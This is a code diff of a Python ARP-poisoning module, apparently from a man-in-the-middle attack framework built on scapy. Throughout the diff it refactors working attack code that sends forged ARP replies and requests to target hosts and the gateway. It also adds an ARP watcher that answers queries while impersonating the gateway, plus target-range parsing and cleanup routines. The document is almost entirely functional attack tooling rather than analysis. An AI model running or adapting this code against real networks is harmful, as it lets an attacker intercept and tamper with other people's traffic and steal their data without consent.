@@ -16,15 +16,12 @@
 # USA
 #
 
-import threading
 import logging
-
-from traceback import print_exc
+import threading
 from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
 from core.logger import logger
-from core.utils import set_ip_forwarding, iptables
 from time import sleep
-from scapy.all import ARP, send, sendp, sniff, getmacbyip
+from scapy.all import *
 
 formatter = logging.Formatter("%(asctime)s [ARPpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
 log = logger().setup_logger("ARPpoisoner", formatter)
@@ -36,78 +33,101 @@ class ARPpoisoner:
     version   = '0.1'
 
     def __init__(self, options):
-
         try:
             self.gatewayip  = str(IPAddress(options.gateway))
         except AddrFormatError as e:
             sys.exit("Specified an invalid IP address as gateway")
 
         self.gatewaymac = getmacbyip(options.gateway)
-        self.targets    = self.get_target_range(options.targets)
+        if self.gatewaymac is None: sys.exit("Error: Could not resolve gateway's MAC address")
+
+        self.ignore     = self.get_range(options.ignore)
+        if self.ignore is None: self.ignore = []
+
+        self.targets    = self.get_range(options.targets)
         self.arpmode    = options.arpmode
         self.debug      = False
         self.send       = True
         self.interval   = 3
         self.interface  = options.interface
+        self.myip       = options.ip
         self.mymac      = options.mac
-
-        if self.gatewaymac is None:
-            sys.exit("Error: Could not resolve gateway's MAC address")
+        self.arp_cache  = {}
 
         log.debug("gatewayip  => {}".format(self.gatewayip))
         log.debug("gatewaymac => {}".format(self.gatewaymac))
         log.debug("targets    => {}".format(self.targets))
+        log.debug("ignore     => {}".format(self.ignore))
+        log.debug("ip         => {}".format(self.myip))
         log.debug("mac        => {}".format(self.mymac))
         log.debug("interface  => {}".format(self.interface))
         log.debug("arpmode    => {}".format(self.arpmode))
         log.debug("interval   => {}".format(self.interval))
 
-        set_ip_forwarding(1)
-        iptables().flush()
-        iptables().http(options.port)
+    def start(self):
+
+        #create a L3 and L2 socket, to be used later to send ARP packets
+        #this doubles performance since send() and sendp() open and close a socket on each packet
+        self.s  = conf.L3socket(iface=self.interface)
+        self.s2 = conf.L2socket(iface=self.interface)
 
         if self.arpmode == 'rep':
-            t = threading.Thread(name='ARPpoisoner-rep', target=self.poison_arp_rep)
+            t = threading.Thread(name='ARPpoisoner-rep', target=self.poison, args=('is-at',))
 
         elif self.arpmode == 'req':
-            t = threading.Thread(name='ARPpoisoner-req', target=self.poison_arp_req)
+            t = threading.Thread(name='ARPpoisoner-req', target=self.poison, args=('who-has',))
 
         t.setDaemon(True)
         t.start()
 
         if self.targets is None:
+            log.debug('Starting ARPWatch')
             t = threading.Thread(name='ARPWatch', target=self.start_arp_watch)
             t.setDaemon(True)
             t.start()
 
-    def get_target_range(self, targets):
+    def get_range(self, targets):
         if targets is None:
             return None
 
         try:
-            targetList = []
+            target_list = []
             for target in targets.split(','):
 
                 if '/' in target:
-                    targetList.append(IPNetwork(target))
+                    target_list.extend(list(IPNetwork(target)))
 
                 elif '-' in target:
-                    first_half = target.split('-')[0]
-                    second_half = first_half + target.split('-')[1]
-                    targetList.append(IPRange(first_half, second_half))
+                    start_addr = IPAddress(target.split('-')[0])
+                    try:
+                        end_addr = IPAddress(target.split('-')[1])
+                        ip_range = IPRange(start_addr, end_addr)
+                    except AddrFormatError:
+                        end_addr = list(start_addr.words)
+                        end_addr[-1] = target.split('-')[1]
+                        end_addr = IPAddress('.'.join(map(str, end_addr)))
+                        ip_range = IPRange(start_addr, end_addr)
+
+                    target_list.extend(list(ip_range))
 
                 else:
-                    targetList.append(IPAddress(target))
+                    target_list.append(IPAddress(target))
 
-            return targetList
-        except AddrFormatError as e:
+            return target_list
+
+        except AddrFormatError:
             sys.exit("Specified an invalid IP address/range/network as target")
 
     def start_arp_watch(self):
-        sniff(prn=self.arp_watch_callback, filter="arp", store=0)
+        try:
+            sniff(prn=self.arp_watch_callback, filter="arp", store=0)
+        except Exception as e:
+            if "Interrupted system call" not in e:
+                log.error("[ARPWatch] Exception occurred when invoking sniff(): {}".format(e))
+            pass
 
     def arp_watch_callback(self, pkt):
-        if self.send is True: #Prevents sending packets on exiting
+        if self.send is True:
             if ARP in pkt and pkt[ARP].op == 1: #who-has only
                 #broadcast mac is 00:00:00:00:00:00
                 packet = None
@@ -117,7 +137,7 @@ class ARPpoisoner:
                 #print str(pkt[ARP].pdst) #ip of destination (Who is ...?)
 
                 if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gatewayip and self.myip != str(pkt[ARP].psrc)):
-                    log.debug("[ARPWatch] {} is asking where the Gateway is. Sending reply: I'm the gateway biatch!'".format(pkt[ARP].psrc))
+                    log.debug("[ARPWatch] {} is asking where the Gateway is. Sending the \"I'm the gateway biatch!\" reply!".format(pkt[ARP].psrc))
                     #send repoison packet
                     packet = ARP()
                     packet.op = 2
@@ -126,7 +146,7 @@ class ARPpoisoner:
                     packet.pdst = str(pkt[ARP].psrc)
 
                 elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
-                    log.debug("[ARPWatch] Gateway asking where {} is. Sending reply: I'm {} biatch!".format(pkt[ARP].pdst, pkt[ARP].pdst))
+                    log.debug("[ARPWatch] Gateway asking where {} is. Sending the \"I'm {} biatch!\" reply!".format(pkt[ARP].pdst, pkt[ARP].pdst))
                     #send repoison packet
                     packet = ARP()
                     packet.op = 2
@@ -135,7 +155,7 @@ class ARPpoisoner:
                     packet.pdst = str(pkt[ARP].pdst)
 
                 elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
-                    log.debug("[ARPWatch] Gateway asking where {} is. Sending reply: This is the h4xx0r box!".format(pkt[ARP].pdst))
+                    log.debug("[ARPWatch] Gateway asking where {} is. Sending the \"This is the h4xx0r box!\" reply!".format(pkt[ARP].pdst))
 
                     packet = ARP()
                     packet.op = 2
@@ -145,165 +165,87 @@ class ARPpoisoner:
 
                 try:
                     if packet is not None:
-                        send(packet, verbose=self.debug, iface=self.interface)
+                        self.s.send(packet)
                 except Exception as e:
                     if "Interrupted system call" not in e:
                         log.error("[ARPWatch] Exception occurred while sending re-poison packet: {}".format(e))
-                    pass
 
-    def poison_arp_rep(self):
+    def resolve_target_mac(self, targetip):
+        targetmac = None
+
+        try:
+            targetmac = self.arp_cache[targetip] # see if we already resolved that address
+            log.debug('{} has already been resolved'.format(targetip))
+        except KeyError:
+            #This following replaces getmacbyip(), much faster this way
+            packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
+            try:
+                resp, _ = sndrcv(self.s2, packet, timeout=2, verbose=False)
+            except Exception as e:
+                resp= ''
+                if "Interrupted system call" not in e:
+                   log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
+
+            if len(resp) > 0:
+                targetmac = resp[0][1].hwsrc
+                self.arp_cache[targetip] = targetmac # shove that address in our cache
+                log.debug("Resolved {} => {}".format(targetip, targetmac))
+            else:
+                log.debug("Unable to resolve MAC address of {}".format(targetip))
+
+        return targetmac
+
+    def poison(self, arpmode):
+        sleep(2)
         while self.send:
 
             if self.targets is None:
-                pkt = Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op="is-at")
-                sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2
+                self.s2.send(Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op=arpmode))
 
             elif self.targets:
-                #Since ARP spoofing relies on knowing the targets MAC address, this whole portion is just error handling in case we can't resolve it
                 for target in self.targets:
+                    targetip  = str(target)
 
-                    if type(target) is IPAddress:
-                        targetip = str(target)
+                    if (targetip != self.myip) and (target not in self.ignore):
+                        targetmac = self.resolve_target_mac(targetip)
 
-                        try:
-                            targetmac = getmacbyip(targetip)
-
-                            if targetmac is None:
-                                log.debug("Unable to resolve MAC address of {}".format(targetip))
-
-                            elif targetmac:
-                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
-                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
-
-                        except Exception as e:
-                            if "Interrupted system call" not in e:
-                               log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
-                            pass
-
-                    if (type(target) is IPRange) or (type(target) is IPNetwork):
-                        for targetip in target:
+                        if targetmac is not None: 
                             try:
-                                targetmac = getmacbyip(str(targetip))
-
-                                if targetmac is None:
-                                    log.debug("Unable to resolve MAC address of {}".format(targetip))
-
-                                elif targetmac:
-                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
-                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
-
+                                log.debug("Poisoning {} <-> {}".format(targetip, self.gatewayip))
+                                self.s.send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op=arpmode))
+                                self.s.send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
                             except Exception as e:
                                 if "Interrupted system call" not in e:
                                    log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
-                                   print_exc()
-                                pass
 
             sleep(self.interval)
 
-    def poison_arp_req(self):
-        while self.send:
-
-            if self.targets is None:
-                pkt = Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op="who-has")
-                sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2
-
-            elif self.targets:
-
-                for target in self.targets:
-
-                    if type(target) is IPAddress:
-                        targetip = str(target)
-                        try:
-                            targetmac = getmacbyip(targetip)
-
-                            if targetmac is None:
-                                log.debug("Unable to resolve MAC address of {}".format(targetip))
-
-                            elif targetmac:
-                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
-                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
-
-                        except Exception as e:
-                            if "Interrupted system call" not in e:
-                               log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
-                            pass
-
-                    if (type(target) is IPRange) or (type(target) is IPNetwork):
-                        for targetip in target:
-                            try:
-                                targetmac = getmacbyip(str(targetip))
-
-                                if targetmac is None:
-                                    log.debug("Unable to resolve MAC address of {}".format(targetip))
-
-                                elif targetmac:
-                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
-                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
-
-                            except Exception as e:
-                                if "Interrupted system call" not in e:
-                                   log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
-                                pass
-
-            sleep(self.interval)
-
-    def options(self, options):
-        options.add_argument('--gateway', dest='gateway', type=str, help='Gateway ip address')
-        options.add_argument('--targets', dest='targets', type=str, help='Specify host/s to poison [if ommited will default to subnet]')
-        options.add_argument('--arpmode', dest='arpmode', default='rep', choices=["rep", "req"], help='ARP Spoofing mode: replies (rep) or requests (req) [default: rep]')
-
-    def on_shutdown(self, options):
+    def stop(self):
         self.send = False
         sleep(3)
-        self.interval = 1
-        count = 5
+        count = 2
 
-        if self.targets:
+        if self.targets is None:
+            log.info("Restoring subnet connection with {} packets".format(count))
+            pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.gatewaymac, psrc=self.gatewayip, op="is-at")
+            for i in range(0, count):
+                self.s2.send(pkt)
+
+        elif self.targets:
             for target in self.targets:
+                targetip = str(target)
+                targetmac = self.resolve_target_mac(targetip)
 
-                if type(target) is IPAddress:
-                    targetip = str(target)
-
+                if targetmac is not None:
+                    log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
                     try:
-                        targetmac = getmacbyip(targetip)
-
-                        if targetmac is None:
-                            log.debug("Unable to resolve MAC address of {}".format(targetip))
-
-                        elif targetmac:
-                            log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
-
-                            send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
-                            send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
-
+                        for i in range(0, count):
+                            self.s.send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac))
+                            self.s.send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac))
                     except Exception as e:
                         if "Interrupted system call" not in e:
                            log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
-                        pass
 
-                if (type(target) is IPRange) or (type(target) is IPNetwork):
-                    for targetip in target:
-                        try:
-                            targetmac = getmacbyip(str(targetip))
-
-                            if targetmac is None:
-                                log.debug("Unable to resolve MAC address of {}".format(targetip))
-
-                            elif targetmac:
-                                log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
-
-                                send(ARP(op="is-at", pdst=self.gatewayip, psrc=str(targetip), hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
-                                send(ARP(op="is-at", pdst=str(targetip), psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
-
-                        except Exception as e:
-                            if "Interrupted system call" not in e:
-                               log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
-                            pass
-
-        elif self.targets is None:
-            log.info("Restoring subnet connection with {} packets".format(count))
-            pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.gatewaymac, psrc=self.gatewayip, op="is-at")
-            sendp(pkt, inter=self.interval, count=count, iface=self.interface, verbose=self.debug) #sends at layer 2
-
-        set_ip_forwarding(0)
-        iptables().flush()
+        #close the sockets
+        self.s.close()
+        self.s2.close()
